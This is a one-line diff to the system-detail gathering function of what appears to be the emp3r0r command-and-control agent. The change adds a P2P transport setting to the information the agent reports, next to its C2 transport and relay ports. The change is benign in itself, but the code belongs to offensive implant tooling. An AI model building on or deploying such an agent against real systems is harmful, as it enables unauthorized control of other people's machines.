@@ -74,6 +74,7 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	info.Transport = genC2TransportString()
 	info.P2PRelayPort = common.RuntimeConfig.P2PRelayPort
 	info.MeshGossipPort = common.RuntimeConfig.MeshGossipPort
+	info.P2PTransport = common.RuntimeConfig.P2PTransport
 	info.Files = util.ListMemFiles()
 
 	if common.RuntimeConfig.IsP2PEnabled {
